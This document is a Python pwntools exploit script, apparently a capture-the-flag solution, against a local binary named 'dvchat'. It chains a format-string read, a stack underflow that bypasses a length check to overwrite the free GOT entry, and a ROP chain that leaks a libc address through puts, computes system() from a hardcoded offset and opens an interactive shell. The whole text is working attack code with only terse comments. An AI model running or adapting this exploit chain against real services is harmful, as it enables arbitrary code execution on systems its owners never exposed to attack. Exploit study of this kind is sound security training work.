from pwn import *
context.arch = 'amd64'
#p = remote('127.0.0.1', 9005)
p = process('./dvchat')
#raw_input(str(p.proc.pid))

scanf = 0x401120
free_got = 0x603018

p.recv(8192)
p.sendline('%14$s')

p.recv(8192)
p.sendline('/bin/sh;')

# fill up buffer
for i in xrange(4):
    sleep(.1)
    p.recv(8192)
    p.sendline('duck'*5)

# overflow prompt message
p.recv(8192)
p.sendline('beach')

sleep(.5)
# stack underflow!
p.recv(8192)
payload = ''
payload += '\x7f'*2            # bypass length check!
payload += '\x20\x11\x40'      # now we controll buf start.
payload += '\x7f'*(3+8)        # trigger stack underflow!
payload += '\x18\x30\x60'
p.sendline(payload)

sleep(1)
p.recv(81920)
print 'send quit?'
raw_input()
p.sendline('/quit')
p.recvuntil('ncurses closed\n')

'''
pattern 5fc3 found at 0x401f83
POP RDI; RET;
'''
rdiret = 0x401f83
ret = 0x401f84
puts = 0x400fc0
libc_start_got = 0x6030c0
stage2 = 0x401c52
# 1st ROP. (leak libc and go to stage2)
payload = 'deadbeef'
payload += pack(rdiret)
payload += pack(libc_start_got)
payload += pack(puts)
payload += pack(ret)            # for alignment
payload += pack(stage2)
payload += pack(0xdeadbeef)*8
payload += pack(free_got)       # this is for next scanf(%$14s)
p.sendline(payload)
sleep(1)

offset = 0x24C50 # libc_start + offset = system.
leak = p.recv(1024)
leak = int(leak[:6][::-1].encode('hex'), 16)
system = leak + offset
print 'system at {0}'.format(hex(system))

payload = ''
payload += pack(system)
p.sendline(payload)
p.interactive()


